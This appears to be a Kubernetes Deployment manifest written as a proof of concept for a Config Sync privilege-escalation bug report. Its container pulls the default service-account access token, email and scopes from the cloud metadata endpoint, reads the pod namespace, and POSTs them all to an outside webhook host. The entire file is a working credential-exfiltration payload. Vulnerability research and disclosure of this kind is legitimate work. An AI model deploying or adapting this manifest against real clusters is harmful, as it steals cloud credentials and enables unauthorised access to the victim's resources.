apiVersion: apps/v1
kind: Deployment
metadata:
  name: bug0172-exfil
  namespace: default
  labels:
    app: bug0172-poc
  annotations:
    bug: "BUG-0172 (D-94602625) gkehub Config Sync two-plane privesc"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: bug0172-exfil
  template:
    metadata:
      labels:
        app: bug0172-exfil
    spec:
      containers:
      - name: exfil
        image: curlimages/curl:latest
        command:
        - /bin/sh
        - -c
        - |
          ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"             | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
          SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
          SCOPES=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes")
          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
          curl -s -X POST https://myr.works/hook.php \
            -H "Content-Type: application/json" \
            -H "X-Test-issue: fromgkehub" \
            -d "{\"access_token\": \"$ACCESS_TOKEN\", \"sa_email\": \"$SA_EMAIL\", \"scopes\": \"$SCOPES\", \"namespace\": \"$NS\", \"source\": \"bug0172-gkehub-configsync\"}"
          echo "Access token exfil sent. Sleeping."
          sleep 3600
